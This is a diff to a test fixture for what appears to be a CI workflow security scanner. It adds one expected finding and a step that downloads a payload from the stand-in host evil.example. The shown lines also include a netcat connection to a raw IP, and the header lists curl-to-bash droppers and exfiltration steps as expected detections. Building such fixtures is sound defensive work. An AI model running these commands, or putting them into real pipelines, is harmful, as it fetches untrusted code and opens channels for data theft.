@@ -3,7 +3,7 @@
 # One file, because all three read the same resolved scripts and a reader
 # comparing them side by side learns more from one workflow than from three.
 #
-# Expected: 10 findings.
+# Expected: 13 findings.
 #
 #   BLOCK  job dropper step 1     curl piped to bash          PPE-003
 #   BLOCK  job dropper step 2     wget piped to sudo sh      PPE-003
@@ -14,6 +14,7 @@
 #   BLOCK  job exfil step 2       the same line, http Warn   PPE-004
 #   BLOCK  job exfil step 4       bare IP, no URL, netcat    PPE-004
 #   WARN   job exfil step 3       plain http:// to a host    PPE-004
+#   WARN   job exfil step 5       address in a URL path      PPE-004
 #   BLOCK  job creds step 1       AWS key id                 PPE-005
 #   BLOCK  job creds step 3       private key block          PPE-005
 #
@@ -72,6 +73,13 @@ jobs:
       # line. Still an endpoint: something is about to connect to it.
       - name: raw socket
         run: nc 203.0.113.7 4444 < /dev/null
+
+      # An address in the path of the URL rather than the host. This is the one
+      # place to hide an address from a scanner that only looks at hosts, so it
+      # is reported. Warn rather than Block, because it is usually a version and
+      # blocking on it would block versioned download URLs in real repositories.
+      - name: version in the path
+        run: curl -sS https://evil.example/1.2.3.4/payload -o /tmp/payload
 
   # Credential shapes. Every value here is a pattern-matching fake.
   # AKIAIOSFODNN7EXAMPLE is the AWS documentation example value, and the
